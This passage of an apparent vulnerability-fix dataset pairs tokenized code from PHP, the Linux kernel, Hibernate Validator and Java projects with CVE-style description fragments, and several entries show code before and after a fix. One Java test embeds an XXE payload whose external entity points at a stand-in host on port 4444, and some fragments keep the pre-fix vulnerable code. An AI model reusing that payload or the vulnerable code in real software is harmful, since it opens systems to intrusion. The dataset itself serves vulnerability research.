";", "stat", "+", "+;", "break", ";", "case", "0x30", ":", "/", "*", "4", ",", "2nd", "*", "/", "case", "0x41", ":", "/", "*", "5", ",", "3rd", "*", "/", "case", "0x52", ":", "/", "*", "6", ",", "4th", "*", "/", "utf", "|", "=", "(", "(", "this_char", "&", "0x3f", ")", "<", "<", "12", ")", ";", "stat", "+", "+;", "break", ";", "case", "0x40", ":", "/", "*", "5", ",", "2nd", "*", "/", "case", "0x51", ":", "utf", "|", "=", "(", "(", "this_char", "&", "0x3f", ")", "<", "<", "18", ")", ";", "stat", "+", "+;", "break", ";", "case", "0x50", ":", "/", "*", "6", ",", "2nd", "*", "/", "utf", "|", "=", "(", "(", "this_char", "&", "0x3f", ")", "<", "<", "24", ")", ";", "stat", "+", "+;", "break", ";", "default", ":", "/", "*", "invalid", "*", "/", "*", "status", "=", "FAILURE", ";", "more", "=", "0", ";", "}", "/", "*", "lead", "byte", "*", "/", "else", "if", "(", "this_char", "<", "0xe0", ")", "{", "stat", "=", "0x10", ";", "/", "*", "2", "byte", "*", "/", "utf", "=", "(", "this_char", "&", "0x1f", ")", "<", "<", "6", ";", "CHECK_LEN", "(", "pos", ",", "1", ")", ";", "}", "else", "if", "(", "this_char", "<", "0xf0", ")", "{", "stat", "=", "0x20", ";", "/", "*", "3", "byte", "*", "/", "utf", "=", "(", "this_char", "&", "0xf", ")", "<", "<", "12", ";", "CHECK_LEN", "(", "pos", ",", "2", ")", ";", "}", "else", "if", "(", "this_char", "<", "0xf8", ")", "{", "stat", "=", "0x30", ";", "/", "*", "4", "byte", "*", "/", "utf", "=", "(", "this_char", "&", "0x7", ")", "<", "<", "18", ";", "CHECK_LEN", "(", "pos", ",", "3", ")", ";", "}", "else", "if", "(", "this_char", "<", "0xfc", ")", "{", "stat", "=", "0x40", ";", "/", "*", "5", "byte", "*", "/", "utf", "=", "(", "this_char", "&", "0x3", ")", "<", "<", "24", ";", "CHECK_LEN", "(", "pos", ",", "4", ")", ";", "}", "else", "if", "(", "this_char", "<", "0xfe", ")", "{", "stat", "=", "0x50", ";", "/", "*", "6", "byte", "*", "/", "utf", "=", "(", "this_char", "&", "0x1", ")", "<", "<", "30", ";", "CHECK_LEN", "(", "pos", ",", "5", ")", ";", "}", "else", "{", "/", "*", "invalid", ";", "bail", "*", "/", "more", "=", "0", ";", "break", ";", "if", "(", "more", ")", "{", "this_char", "=", "str", "[", "pos", "+", "+]", ";", "MB_WRITE", "(", "(", "unsigned", "char", ")", "this_char", ")", ";", "}", "while", "(", "more", ")", ";", "if", "(", "this_char", ">", "=", "0xa1", "&", "&", "this_char", "<", "=", "0xfe", ")", "{", "next_char", "=", "str", "[", "pos", "]", ";", "this_char", "<", "<=", "8", ";", "this_char", "|", "=", "next_char", ";", "pos", "+", "+;", "break", ";", "if", "(", "(", "this_char", ">", "=", "0x81", "&", "&", "this_char", "<", "=", "0x9f", ")", "|", "|", "(", "this_char", ">", "=", "0xe0", "&", "&", "this_char", "<", "=", "0xef", ")", ")", "{", "next_char", "=", "str", "[", "pos", "]", ";", "this_char", "<", "<=", "8", ";", "this_char", "|", "=", "next_char", ";", "pos", "+", "+;", "next_char", "=", "str", "[", "pos", "]", ";", "this_char", "<", "<=", "8", ";", "this_char", "|", "=", "next_char", ";", "pos", "+", "+;", "next_char", "=", "str", "[", "pos", "]", ";", "this_char", "<", "<=", "8", ";", "this_char", "|", "=", "next_char", ";", "pos", "+", "+;", "next2_char", "=", "str", "[", "pos", "+", "1", "]", ";", "this_char", "<", "<=", "8", ";", "this_char", "|", "=", "next_char", ";", "pos", "+", "+;", "this_char", "<", "<=", "8", ";", "this_char", "|", "=", "next2_char", ";", "pos", "+", "+;", "unsigned", "short", "this_char", "=", "get_next_char", "(", "charset", ",", "old", ",", "oldlen", ",", "&", "i", ",", "mbsequence", ",", "&", "mbseqlen", ",", "&", "status", ")", ";"], "docstring_tokens": ["by", "placing", "a", "crafted", "byte", "sequence", "before", "a", "special", "character", "."]}
{"contents": ["empty"], "code_tokens": ["if", "(", "!", "cores", ".", "getZkController", "(", ").", "getZkStateReader", "(", ").", "getClusterState", "(", ").", "getLiveNodes", "(", ").", "contains", "(", "nodename", ")", ")", "return", "null", ";</s>"], "docstring_tokens": ["create", "a", "specially", "crafted", "node", "name", "that", "does", "not", "exist", "as", "part", "of", "the", "cluster", "and", "point", "it", "to", "a", "malicious", "node"]}
{"contents": ["empty"], "code_tokens": ["factory", ".", "setProperty", "(", "XMLInputFactory", ".", "SUPPORT_DTD", ",", "false", ")", ";", "@", "Test", "public", "void", "ignoresDtds", "(", ")", "{", "RunTest", "(", "getSampleWithDtd", "(", "))", ";", "assertProjectCreated", "(", "project", ",", "4", ",", "6", ")", ";", "Row", "row", "=", "project", ".", "rows", ".", "get", "(", "0", ")", ";", "Assert", ".", "assertNotNull", "(", "row", ")", ";", "Assert", ".", "assertNotNull", "(", "row", ".", "getCell", "(", "1", ")", ");", "Assert", ".", "assertEquals", "(", "row", ".", "getCell", "(", "1", ")", ".", "value", ",", "\"", "Author", "1", ",", "The", "\"", ");", "}", "public", "static", "String", "getSampleWithDtd", "(", "){", "StringBuilder", "sb", "=", "new", "StringBuilder", "(", ");", "sb", ".", "append", "(", "\"<", "?", "xml", "version", "=", "\\\"", "1", ".", "0", "\\", "\"?", ">\"", ");", "sb", ".", "append", "(", "\"<", "!", "DOCTYPE", "library", "[", "\\", "n", "\"", "+", "\"", "<!", "ENTITY", "%", "asd", "SYSTEM", "\\", "\"", "http", ":", "//", "domain", ".", "does", ".", "not", ".", "exist", ":", "4444", "/", "ext", ".", "dtd", "\\", "\">", "\\", "n", "\"", "+", "\"", "%", "asd", ";", "\\", "n", "\"", "+", "\"", "%", "c", ";", "\\", "n", "\"", "+", "\"", "]>", "<", "library", ">", "\")", ";", "for", "(", "int", "i", "=", "1", ";", "i", "<", "7", ";", "i", "+", "+)", "{", "sb", ".", "append", "(", "getTypicalElement", "(", "i", ")", ");", "}", "sb", ".", "append", "(", "\"<", "/", "library", ">", "\")", ";", "return", "sb", ".", "toString", "(", ");", "}</s>"], "docstring_tokens": ["persuading", "a", "victim", "to", "open", "a", "specially-crafted", "file"]}
{"contents": ["empty"], "code_tokens": ["#", "define", "DOUBLEFAULT_STACK", "1", "#", "define", "NMI_STACK", "2", "#", "define", "DEBUG_STACK", "3", "#", "define", "MCE_STACK", "4", "#", "define", "N_EXCEPTION_STACKS", "4", "/", "*", "hw", "limit", ":", "7", "*", "/", "#", "define", "trace_stack_segment", "stack_segment", "idtentry", "stack_segment", "do_stack_segment", "has_error_code", "=", "1", "set_intr_gate", "(", "X86_TRAP_SS", ",", "stack_segment", ")", ";</s>#", "define", "STACKFAULT_STACK", "0", "#", "define", "STACKFAULT_STACK", "1", "#", "define", "DOUBLEFAULT_STACK", "2", "#", "define", "NMI_STACK", "3", "#", "define", "DEBUG_STACK", "4", "#", "define", "MCE_STACK", "5", "#", "define", "N_EXCEPTION_STACKS", "5", "/", "*", "hw", "limit", ":", "7", "*", "/", "[", "STACKFAULT_STACK", "-", "1", "]", "=", "\"", "#", "SS", "\"", ",", "idtentry", "stack_segment", "do_stack_segment", "has_error_code", "=", "1", "paranoid", "=", "1", "#", "ifdef", "CONFIG_X86_32", "#", "endif", "dotraplinkage", "void", "do_stack_segment", "(", "struct", "pt_regs", "*", "regs", ",", "long", "error_code", ")", "{", "enum", "ctx_state", "prev_state", ";", "prev_state", "=", "exception_enter", "(", ");", "if", "(", "notify_die", "(", "DIE_TRAP", ",", "\"", "stack", "segment", "\"", ",", "regs", ",", "error_code", ",", "X86_TRAP_SS", ",", "SIGBUS", ")", "!", "=", "NOTIFY_STOP", ")", "{", "preempt_conditional_sti", "(", "regs", ")", ";", "do_trap", "(", "X86_TRAP_SS", ",", "SIGBUS", ",", "\"", "stack", "segment", "\"", ",", "regs", ",", "error_code", ",", "NULL", ")", ";", "preempt_conditional_cli", "(", "regs", ")", ";", "}", "exception_exit", "(", "prev_state", ")", ";", "}", "set_intr_gate_ist", "(", "X86_TRAP_SS", ",", "&", "stack_segment", ",", "STACKFAULT_STACK", ")", ";"], "docstring_tokens": ["executing", "following", "instruction"]}
{"contents": ["empty"], "code_tokens": ["-", "Fixed", "bug", "#", "49687", "(", "utf8_decode", "vulnerabilities", "and", "deficiencies", "in", "the", "number", "of", "reported", "malformed", "sequences", ")", ".", "(", "Gustavo", ")", "-", "-", "TEST", "-", "-", "Bug", "#", "49687", "Several", "utf8_decode", "deficiencies", "and", "vulnerabilities", "-", "-", "SKIPIF", "-", "-", "<", "?", "php", "require_once", "(", "\"", "skipif", ".", "inc", "\"", ");", "if", "(", "!", "extension_loaded", "(", "'", "xml", "'", "))", "die", "(", "\"", "skip", "xml", "extension", "not", "available", "\"", ");", "?", ">", "-", "-", "FILE", "-", "-", "<", "?", "php", "$", "tests", "=", "array", "(", "\"", "\\", "x41", "\\", "xC2", "\\", "x3E", "\\", "x42", "\"", ",", "\"", "\\", "xE3", "\\", "x80", "\\", "x22", "\"", ",", "\"", "\\", "x41", "\\", "x98", "\\", "xBA", "\\", "x42", "\\", "xE2", "\\", "x98", "\\", "x43", "\\", "xE2", "\\", "x98", "\\", "xBA", "\\", "xE2", "\\", "x98", "\"", ",", ")", ";", "foreach", "(", "$", "tests", "as", "$", "t", ")", "{", "echo", "bin2hex", "(", "utf8_decode", "(", "$", "t", ")", "),", "\"", "\\", "n", "\"", ";", "}", "echo", "\"", "Done", ".", "\\", "n", "\"", ";", "-", "-", "EXPECT", "-", "-", "413f3e42", "3f22", "413f3f423f433f3f", "Done", ".", "@", "@", "-", "659", ",", "10", "+", "659", ",", "111", "@", "@", "PHPAPI", "char", "*", "xml_utf8_encode", "(", "const", "char", "*", "s", ",", "int", "len", ",", "int", "*", "newlen", ",", "const", "XML_Char", "/", "*", "copied", "from", "trunk", "'", "s", "implementation", "of", "get_next_char", "in", "ext", "/", "standard", "/", "html", ".", "c", "*", "/", "#", "define", "MB_FAILURE", "(", "pos", ",", "advance", ")", "do", "{", "\\", "*", "cursor", "=", "pos", "+", "(", "advance", ")", ";", "\\", "*", "status", "=", "FAILURE", ";", "\\", "return", "0", ";", "\\", "}", "while", "(", "0", ")", "#", "define", "CHECK_LEN", "(", "pos", ",", "chars_need", ")", "(", "(", "str_len", "-", "(", "pos", ")", ")", ">", "=", "(", "chars_need", ")", ")", "#", "define", "utf8_lead", "(", "c", ")", "(", "(", "c", ")", "<", "0x80", "|", "|", "(", "(", "c", ")", ">", "=", "0xC2", "&", "&", "(", "c", ")", "<", "=", "0xF4", ")", ")", "#", "define", "utf8_trail", "(", "c", ")", "(", "(", "c", ")", ">", "=", "0x80", "&", "&", "(", "c", ")", "<", "=", "0xBF", ")", "/", "*", "{", "{{", "php_next_utf8_char", "*", "/", "static", "inline", "unsigned", "int", "php_next_utf8_char", "(", "const", "unsigned", "char", "*", "str", ",", "size_t", "str_len", ",", "size_t", "*", "cursor", ",", "int", "*", "status", ")", "{", "size_t", "pos", "=", "*", "cursor", ";", "unsigned", "int", "this_char", "=", "0", ";", "unsigned", "char", "c", ";", "*", "status", "=", "SUCCESS", ";", "if", "(", "!", "CHECK_LEN", "(", "pos", ",", "1", ")", ")", "MB_FAILURE", "(", "pos", ",", "1", ")", ";", "/", "*", "We", "'", "ll", "follow", "strategy", "2", ".", "from", "section", "3", ".", "6", ".", "1", "of", "UTR", "#", "36", ":", "*", "\"", "In", "a", "reported", "illegal", "byte", "sequence", ",", "do", "not", "include", "any", "*", "non", "-", "initial", "byte", "that", "encodes", "a", "valid", "character", "or", "is", "a", "leading", "*", "byte", "for", "a", "valid", "sequence", ".", "\ufffd", "*", "/", "c", "=", "str", "[", "pos", "]", ";", "if", "(", "c", "<", "0x80", ")", "{", "this_char", "=", "c", ";", "pos", "+", "+;", "}", "else", "if", "(", "c", "<", "0xc2", ")", "{", "MB_FAILURE", "(", "pos", ",", "1", ")", ";", "}", "else", "if", "(", "c", "<", "0xe0", ")", "{", "if", "(", "!", "CHECK_LEN", "(", "pos", ",", "2", ")", ")", "MB_FAILURE", "(", "pos", ",", "1", ")", ";", "if", "(", "!", "utf8_trail", "(", "str", "[", "pos", "+", "1", "]", "))", "{", "MB_FAILURE", "(", "pos", ",", "utf8_lead", "(", "str", "[", "pos", "+", "1", "]", ")", "?", "1", ":", "2", ")", ";", "}", "this_char", "=", "(", "(", "c", "&", "0x1f", ")", "<", "<", "6", ")", "|", "(", "str", "[", "pos", "+", "1", "]", "&", "0x3f", ")", ";", "if", "(", "this_char", "<", "0x80", ")", "{", "/", "*", "non", "-", "shortest", "form", "*", "/", "MB_FAILURE", "(", "pos", ",", "2", ")", ";", "}", "pos", "+", "=", "2", ";", "}", "else", "if", "(", "c", "<", "0xf0", ")", "{", "size_t", "avail", "=", "str_len", "-", "pos", ";", "if", "(", "avail", "<", "3", "|", "|", "!", "utf8_trail", "(", "str", "[", "pos", "+", "1", "]", ")", "|", "|", "!", "utf8_trail", "(", "str", "[", "pos", "+", "2", "]", "))", "{", "if", "(", "avail", "<", "2", "|", "|", "utf8_lead", "(", "str", "[", "pos", "+", "1", "]", "))", "MB_FAILURE", "(", "pos", ",", "1", ")", ";", "else", "if", "(", "avail", "<", "3", "|", "|", "utf8_lead", "(", "str", "[", "pos", "+", "2", "]", "))", "MB_FAILURE", "(", "pos", ",", "2", ")", ";", "else", "MB_FAILURE", "(", "pos", ",", "3", ")", ";", "}", "this_char", "=", "(", "(", "c", "&", "0x0f", ")", "<", "<", "12", ")", "|", "(", "(", "str", "[", "pos", "+", "1", "]", "&", "0x3f", ")", "<", "<", "6", ")", "|", "(", "str", "[", "pos", "+", "2", "]", "&", "0x3f", ")", ";", "if", "(", "this_char", "<", "0x800", ")", "{", "/", "*", "non", "-", "shortest", "form", "*", "/", "MB_FAILURE", "(", "pos", ",", "3", ")", ";", "}", "else", "if", "(", "this_char", ">", "=", "0xd800", "&", "&", "this_char", "<", "=", "0xdfff", ")", "{", "/", "*", "surrogate", "*", "/", "MB_FAILURE", "(", "pos", ",", "3", ")", ";", "}", "pos", "+", "=", "3", ";", "}", "else", "if", "(", "c", "<", "0xf5", ")", "{", "size_t", "avail", "=", "str_len", "-", "pos", ";", "if", "(", "avail", "<", "4", "|", "|", "!", "utf8_trail", "(", "str", "[", "pos", "+", "1", "]", ")", "|", "|", "!", "utf8_trail", "(", "str", "[", "pos", "+", "2", "]", ")", "|", "|", "!", "utf8_trail", "(", "str", "[", "pos", "+", "3", "]", "))", "{", "if", "(", "avail", "<", "2", "|", "|", "utf8_lead", "(", "str", "[", "pos", "+", "1", "]", "))", "MB_FAILURE", "(", "pos", ",", "1", ")", ";", "else", "if", "(", "avail", "<", "3", "|", "|", "utf8_lead", "(", "str", "[", "pos", "+", "2", "]", "))", "MB_FAILURE", "(", "pos", ",", "2", ")", ";", "else", "if", "(", "avail", "<", "4", "|", "|", "utf8_lead", "(", "str", "[", "pos", "+", "3", "]", "))", "MB_FAILURE", "(", "pos", ",", "3", ")", ";", "else", "MB_FAILURE", "(", "pos", ",", "4", ")", ";", "}", "this_char", "=", "(", "(", "c", "&", "0x07", ")", "<", "<", "18", ")", "|", "(", "(", "str", "[", "pos", "+", "1", "]", "&", "0x3f", ")", "<", "<", "12", ")", "|", "(", "(", "str", "[", "pos", "+", "2", "]", "&", "0x3f", ")", "<", "<", "6", ")", "|", "(", "str", "[", "pos", "+", "3", "]", "&", "0x3f", ")", ";", "if", "(", "this_char", "<", "0x10000", "|", "|", "this_char", ">", "0x10FFFF", ")", "{", "/", "*", "non", "-", "shortest", "form", "or", "outside", "range", "*", "/", "MB_FAILURE", "(", "pos", ",", "4", ")", ";", "}", "pos", "+", "=", "4", ";", "}", "else", "{", "MB_FAILURE", "(", "pos", ",", "1", ")", ";", "}", "*", "cursor", "=", "pos", ";", "return", "this_char", ";", "}", "/", "*", "}", "}}", "*", "/", "size_t", "pos", "=", "0", ";", "while", "(", "pos", "<", "(", "size_t", ")", "len", ")", "{", "int", "status", "=", "FAILURE", ";", "c", "=", "php_next_utf8_char", "(", "(", "const", "unsigned", "char", "*", ")", "s", ",", "(", "size_t", ")", "len", ",", "&", "pos", ",", "&", "status", ")", ";", "if", "(", "status", "=", "=", "FAILURE", "|", "|", "c", ">", "0xFFU", ")", "{", "c", "=", "'", "?'", ";", "+", "+*", "newlen", ";</s>-", "Fixed", "bug", "#", "50345", "(", "nanosleep", "not", "detected", "properly", "on", "some", "solaris", "versions", ")", ".", "-", "Fixed", "bug", "#", "49407", "(", "get_html_translation_table", "doesn", "'", "t", "handle", "UTF", "-", "8", ")", ".", "(", "Gustavo", ")", "-", "Fixed", "bug", "#", "49215", "(", "make", "fails", "on", "glob_wrapper", ")", ".", "(", "Felipe", ")", "-", "Fixed", "bug", "#", "48831", "(", "php", "-", "i", "has", "different", "output", "to", "php", "-", "-", "ini", ")", ".", "(", "Richard", ",", "@", "@", "-", "0", ",", "0", "+", "1", ",", "24", "@", "@", "int", "pos", "=", "len", ";", "while", "(", "pos", ">", "0", ")", "{", "c", "=", "(", "unsigned", "char", ")", "(*", "s", ")", ";", "if", "(", "c", ">", "=", "0xf0", ")", "{", "/", "*", "four", "bytes", "encoded", ",", "21", "bits", "*", "/", "if", "(", "pos", "-", "4", ">", "=", "0", ")", "{", "c", "=", "(", "(", "s", "[", "0", "]", "&", "7", ")", "<<", "18", ")", "|", "(", "(", "s", "[", "1", "]", "&", "63", ")", "<<", "12", ")", "|", "(", "(", "s", "[", "2", "]", "&", "63", ")", "<<", "6", ")", "|", "(", "s", "[", "3", "]", "&", "63", ")", ";", "}", "else", "{", "c", "=", "'", "?'", ";", "}", "s", "+", "=", "4", ";", "pos", "-", "=", "4", ";", "}", "else", "if", "(", "c", ">", "=", "0xe0", ")", "{", "/", "*", "three", "bytes", "encoded", ",", "16", "bits", "*", "/", "if", "(", "pos", "-", "3", ">", "=", "0", ")", "{", "c", "=", "(", "(", "s", "[", "0", "]", "&", "63", ")", "<<", "12", ")", "|", "(", "(", "s", "[", "1", "]", "&", "63", ")", "<<", "6", ")", "|", "(", "s", "[", "2", "]", "&", "63", ")", ";", "}", "else", "{", "c", "=", "'", "?'", ";", "}", "s", "+", "=", "3", ";", "pos", "-", "=", "3", ";", "}", "else", "if", "(", "c", ">", "=", "0xc0", ")", "{", "/", "*", "two", "bytes", "encoded", ",", "11", "bits", "*", "/", "if", "(", "pos", "-", "2", ">", "=", "0", ")", "{", "c", "=", "(", "(", "s", "[", "0", "]", "&", "63", ")", "<<", "6", ")", "|", "(", "s", "[", "1", "]", "&", "63", ")", ";", "}", "else", "{", "c", "=", "'", "?'", ";", "}", "s", "+", "=", "2", ";", "pos", "-", "=", "2", ";", "}", "else", "{", "s", "+", "+;", "pos", "-", "-;"], "docstring_tokens": ["a", "specially-crafted", "string"]}
{"contents": ["empty"], "code_tokens": ["if", "(", "state", "-", ">", "bucket", "<", "UDP_HTABLE_SIZE", ")", "spin_unlock_bh", "(", "&", "state", "-", ">", "udp_table", "-", ">", "hash", "[", "state", "-", ">", "bucket", "]", ".", "lock", ")", ";", "struct", "udp_iter_state", "*", "state", "=", "seq", "-", ">", "private", ";", "state", "-", ">", "bucket", "=", "UDP_HTABLE_SIZE", ";</s>spin_unlock_bh", "(", "&", "state", "-", ">", "udp_table", "-", ">", "hash", "[", "state", "-", ">", "bucket", "]", ".", "lock", ")", ";"], "docstring_tokens": ["reading", "zero", "bytes"]}
{"contents": ["empty"], "code_tokens": ["import", "java", ".", "lang", ".", "reflect", ".", "AccessibleObject", ";", "import", "java", ".", "lang", ".", "reflect", ".", "Field", ";", "import", "java", ".", "lang", ".", "reflect", ".", "Member", ";", "import", "java", ".", "security", ".", "AccessController", ";", "import", "java", ".", "security", ".", "PrivilegedAction", ";", "import", "java", ".", "util", ".", "concurrent", ".", "ConcurrentMap", ";", "import", "org", ".", "hibernate", ".", "validator", ".", "internal", ".", "util", ".", "ConcurrentReferenceHashMap", ";", "import", "org", ".", "hibernate", ".", "validator", ".", "internal", ".", "util", ".", "ConcurrentReferenceHashMap", ".", "ReferenceType", ";", "import", "org", ".", "hibernate", ".", "validator", ".", "internal", ".", "util", ".", "privilegedactions", ".", "GetDeclaredField", ";", "import", "org", ".", "hibernate", ".", "validator", ".", "internal", ".", "util", ".", "privilegedactions", ".", "GetDeclaredMethod", ";", "import", "org", ".", "hibernate", ".", "validator", ".", "internal", ".", "util", ".", "privilegedactions", ".", "SetAccessibility", ";", "/", "**", "*", "Keeps", "an", "accessible", "version", "for", "each", "non", "-", "accessible", "member", "whose", "value", "needs", "to", "be", "accessed", "during", "validation", ".", "*", "/", "private", "final", "ConcurrentMap", "<", "Member", ",", "Member", ">", "accessibleMembers", ";", "this", ".", "accessibleMembers", "=", "new", "ConcurrentReferenceHashMap", "<", "Member", ",", "Member", ">", "(", "100", ",", "ReferenceType", ".", "SOFT", ",", "ReferenceType", ".", "SOFT", ")", ";", "Object", "valueToValidate", "=", "getValue", "(", "metaConstraint", ".", "getLocation", "(", ").", "getMember", "(", "),", "valueContext", ".", "getCurrentBean", "(", ")", ")", ";", "Object", "value", "=", "getValue", "(", "valueContext", ".", "getCurrentBean", "(", "),", "cascadable", ")", ";", "newValue", "=", "newValue", "=", "=", "null", "?", "null", ":", "getValue", "(", "newValue", ",", "property", ")", ";", "private", "Object", "getValue", "(", "Object", "object", ",", "Cascadable", "cascadable", ")", "{", "if", "(", "cascadable", "instanceof", "PropertyMetaData", ")", "{", "Member", "member", "=", "getAccessible", "(", "(", "(", "PropertyMetaData", ")", "cascadable", ")", ".", "getCascadingMember", "(", ")", ")", ";", "return", "getValue", "(", "member", ",", "object", ")", ";", "}", "else", "if", "(", "cascadable", "instanceof", "ParameterMetaData", ")", "{", "return", "(", "(", "Object", "[", "])", "object", ")", "[(", "(", "ParameterMetaData", ")", "cascadable", ")", ".", "getIndex", "(", ")]", ";", "}", "else", "{", "return", "object", ";", "}", "}", "private", "Object", "getValue", "(", "Member", "member", ",", "Object", "object", ")", "{", "if", "(", "member", "=", "=", "null", ")", "{", "return", "object", ";", "}", "member", "=", "getAccessible", "(", "member", ")", ";", "if", "(", "member", "instanceof", "Method", ")", "{", "return", "ReflectionHelper", ".", "getValue", "(", "(", "Method", ")", "member", ",", "object", ")", ";", "}", "else", "if", "(", "member", "instanceof", "Field", ")", "{", "return", "ReflectionHelper", ".", "getValue", "(", "(", "Field", ")", "member", ",", "object", ")", ";", "}", "return", "null", ";", "}", "/", "**", "*", "Returns", "an", "accessible", "version", "of", "the", "given", "member", ".", "Will", "be", "the", "given", "member", "itself", "in", "case", "it", "is", "accessible", ",", "*", "otherwise", "a", "copy", "which", "is", "set", "accessible", ".", "These", "copies", "are", "maintained", "in", "the", "*", "{", "@", "link", "ValidatorImpl", "#", "accessibleMembers", "}", "cache", ".", "*", "/", "private", "Member", "getAccessible", "(", "Member", "original", ")", "{", "if", "(", "(", "(", "AccessibleObject", ")", "original", ")", ".", "isAccessible", "(", ")", ")", "{", "return", "original", ";", "}", "Member", "member", "=", "accessibleMembers", ".", "get", "(", "original", ")", ";", "if", "(", "member", "!", "=", "null", ")", "{", "return", "member", ";", "}", "Class", "<", "?>", "clazz", "=", "original", ".", "getDeclaringClass", "(", ");", "if", "(", "original", "instanceof", "Field", ")", "{", "member", "=", "run", "(", "GetDeclaredField", ".", "action", "(", "clazz", ",", "original", ".", "getName", "(", ")", ")", ")", ";", "}", "else", "{", "member", "=", "run", "(", "GetDeclaredMethod", ".", "action", "(", "clazz", ",", "original", ".", "getName", "(", ")", ")", ")", ";", "}", "run", "(", "SetAccessibility", ".", "action", "(", "member", ")", ")", ";", "Member", "cached", "=", "accessibleMembers", ".", "putIfAbsent", "(", "original", ",", "member", ")", ";", "if", "(", "cached", "!", "=", "null", ")", "{", "member", "=", "cached", ";", "}", "return", "member", ";", "}", "/", "**", "*", "Runs", "the", "given", "privileged", "action", ",", "using", "a", "privileged", "block", "if", "required", ".", "*", "<", "p", ">", "*", "<", "b", ">", "NOTE", ":", "</", "b", ">", "This", "must", "never", "be", "changed", "into", "a", "publicly", "available", "method", "to", "avoid", "execution", "of", "arbitrary", "*", "privileged", "actions", "within", "HV", "'", "s", "protection", "domain", ".", "*", "/", "private", "<", "T", ">", "T", "run", "(", "PrivilegedAction", "<", "T", ">", "action", ")", "{", "return", "System", ".", "getSecurityManager", "(", ")", "!", "=", "null", "?", "AccessController", ".", "doPrivileged", "(", "action", ")", ":", "action", ".", "run", "(", ");", "}", "ReflectionHelper", ".", "getValue", "(", "persistenceUtilGetter", ",", "persistence", ")", ";", "public", "Member", "getCascadingMember", "(", ")", "{", "return", "cascadingMember", ";</s>Object", "valueToValidate", "=", "metaConstraint", ".", "getValue", "(", "valueContext", ".", "getCurrentBean", "(", ")", ")", ";", "Object", "value", "=", "cascadable", ".", "getValue", "(", "valueContext", ".", "getCurrentBean", "(", ")", ")", ";", "newValue", "=", "newValue", "=", "=", "null", "?", "null", ":", "property", ".", "getValue", "(", "newValue", ")", ";", "ReflectionHelper", ".", "getValue", "(", "persistenceUtilGetter", ",", "persistence", ")", ";", "@", "Override", "public", "Object", "getValue", "(", "Object", "parent", ")", "{", "return", "(", "(", "Object", "[", "])", "parent", ")", "[", "index", "]", ";", "}", "@", "Override", "public", "Object", "getValue", "(", "Object", "parent", ")", "{", "return", "ReflectionHelper", ".", "getValue", "(", "cascadingMember", ",", "parent", ")", ";", "@", "Override", "public", "Object", "getValue", "(", "Object", "parent", ")", "{", "return", "parent", ";", "}", "import", "org", ".", "hibernate", ".", "validator", ".", "internal", ".", "util", ".", "ReflectionHelper", ";", "/", "**", "*", "@", "param", "o", "the", "object", "from", "which", "to", "retrieve", "the", "value", ".", "*", "*", "@", "return", "Returns", "the", "value", "for", "this", "constraint", "from", "the", "specified", "object", ".", "Depending", "on", "the", "type", "either", "the", "value", "itself", "*", "is", "returned", "of", "method", "or", "field", "access", "is", "used", "to", "access", "the", "value", ".", "*", "/", "public", "Object", "getValue", "(", "Object", "o", ")", "{", "if", "(", "location", ".", "getMember", "(", ")", "=", "=", "null", ")", "{", "return", "o", ";", "}", "else", "{", "return", "ReflectionHelper", ".", "getValue", "(", "location", ".", "getMember", "(", "),", "o", ")", ";", "}", "}", "/", "**", "*", "Retrieves", "the", "value", "of", "this", "element", "from", "the", "given", "object", ".", "*", "*", "@", "param", "parent", "The", "object", "to", "retrieve", "the", "value", "from", ".", "*", "*", "@", "return", "This", "element", "'", "s", "value", ".", "*", "/", "Object", "getValue", "(", "Object", "parent", ")", ";", "import", "java", ".", "security", ".", "AccessController", ";", "import", "java", ".", "security", ".", "PrivilegedAction", ";", "import", "org", ".", "hibernate", ".", "validator", ".", "internal", ".", "util", ".", "privilegedactions", ".", "SetAccessibility", ";", "if", "(", "isConstrained", "(", ")", ")", "{", "run", "(", "SetAccessibility", ".", "action", "(", "location", ".", "getMember", "(", ")", ")", ")", ";", "}", "private", "<", "T", ">", "T", "run", "(", "PrivilegedAction", "<", "T", ">", "action", ")", "{", "return", "System", ".", "getSecurityManager", "(", ")", "!", "=", "null", "?", "AccessController", ".", "doPrivileged", "(", "action", ")", ":", "action", ".", "run", "(", ");", "}", "import", "java", ".", "lang", ".", "reflect", ".", "Member", ";", "import", "java", ".", "security", ".", "AccessController", ";", "import", "java", ".", "security", ".", "PrivilegedAction", ";", "import", "org", ".", "hibernate", ".", "validator", ".", "internal", ".", "util", ".", "privilegedactions", ".", "SetAccessibility", ";", "Member", "member", "=", "location", ".", "getMember", "(", ");", "if", "(", "member", "!", "=", "null", "&", "&", "isConstrained", "(", ")", ")", "{", "run", "(", "SetAccessibility", ".", "action", "(", "member", ")", ")", ";", "}", "private", "<", "T", ">", "T", "run", "(", "PrivilegedAction", "<", "T", ">", "action", ")", "{", "return", "System", ".", "getSecurityManager", "(", ")", "!", "=", "null", "?", "AccessController", ".", "doPrivileged", "(", "action", ")", ":", "action", ".", "run", "(", ");", "}"], "docstring_tokens": ["via", "a", "crafted", "application", "."]}
{"contents": ["empty"], "code_tokens": ["import", "javax", ".", "management", ".", "remote", ".", "rmi", ".", "RMIConnectorServer", ";", "import", "javax", ".", "management", ".", "remote", ".", "rmi", ".", "RMIJRMPServerImpl", ";", "import", "java", ".", "rmi", ".", "NotBoundException", ";", "import", "java", ".", "rmi", ".", "Remote", ";", "import", "java", ".", "rmi", ".", "RemoteException", ";", "import", "java", ".", "util", ".", "concurrent", ".", "atomic", ".", "AtomicReference", ";", "*", "<", "p", ">", "Originally", "based", "on", "j256", "simplejmx", "project", "private", "final", "AtomicReference", "<", "Remote", ">", "rmiServerReference", "=", "new", "AtomicReference", "<", ">(", ");", "internalStart", "(", "port", ")", ";", "private", "void", "internalStart", "(", "int", "port", ")", "throws", "IOException", "{", "rmiServerReference", ".", "set", "(", "null", ")", ";", "/", "/", "this", "allows", "clients", "to", "lookup", "the", "JMX", "service", "rmiRegistry", "=", "new", "JmxRegistry", "(", "port", ",", "\"", "jmxrmi", "\"", ",", "rmiServerReference", ")", ";", "final", "RMIJRMPServerImpl", "rmiServer", "=", "new", "RMIJRMPServerImpl", "(", "port", ",", "null", ",", "null", ",", "null", ")", ";", "connector", "=", "new", "RMIConnectorServer", "(", "url", ",", "null", ",", "rmiServer", ",", "ManagementFactory", ".", "getPlatformMBeanServer", "(", "))", ";", "/", "/", "we", "can", "'", "t", "pass", "the", "created", "stub", "directly", "to", "the", "registry", "since", "this", "would", "form", "a", "cyclic", "dependency", ":", "/", "/", "-", "you", "can", "only", "start", "the", "connector", "after", "the", "registry", "was", "started", "/", "/", "-", "you", "can", "only", "create", "the", "stub", "after", "the", "connector", "was", "started", "/", "/", "-", "you", "can", 